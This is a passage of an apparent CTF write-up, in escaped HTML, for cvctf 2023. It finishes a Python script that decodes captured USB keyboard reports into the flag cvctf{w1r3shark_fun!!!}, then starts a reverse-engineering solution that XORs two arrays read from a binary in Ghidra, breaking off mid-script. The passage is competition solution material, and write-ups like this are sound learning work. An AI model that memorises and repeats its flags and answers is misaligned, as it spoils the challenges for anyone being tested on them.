&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;line &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;            presses&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(line[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;    result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;press &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;presses:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;press &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;:&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;press:
&lt;&#x2F;span&gt;&lt;span&gt;            Bytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;press&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            Bytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[press[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(press)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;00&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;00&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;normalKeys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]):
&lt;&#x2F;span&gt;&lt;span&gt;                result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;normalKeys[Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]]
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0b10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0b100000&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# shift key is pressed.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;00&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;normalKeys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]):
&lt;&#x2F;span&gt;&lt;span&gt;                result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;shiftKeys[Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]]
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[-] Unknow Key : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(Bytes[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] Found : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(result))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#cvctf{w1r3shark_fun!!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{w1r3shark_fun!!!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev&quot; aria-label=&quot;Anchor link for: rev&quot;&gt;Rev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;simple-checkin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#simple-checkin&quot; aria-label=&quot;Anchor link for: simple-checkin&quot;&gt;Simple Checkin&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_checkin.png&quot; alt=&quot;simple checkin&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;cvctf23&#x2F;challenge&quot;&gt;challenge&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A binary file was given, I used &lt;a&gt;ghidra&lt;&#x2F;a&gt; to view the source code of it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf23&#x2F;cvctf23_checkin1.png&quot; alt=&quot;simple checkin&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In main function I observed that there were two long array are assigned to some values. And when I scroll down an &lt;code&gt;XOR&lt;&#x2F;code&gt; operation was done between these two array elements.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;C&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-C &quot;&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(local_78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; local_7c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; local_78 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;		    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((local_68[local_78] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)local_48[local_78]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; local_58[local_78]) {
&lt;&#x2F;span&gt;&lt;span&gt;		      local_74 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		    }
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, I copied the values of those two arrays performed a simple XOR between them, it resulted the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Here, is the solution script&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;local_68 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;local_58 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x68
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xac
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdc
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x88
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xed
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x94
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe4
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x70
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xeb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x87
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf4
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb6
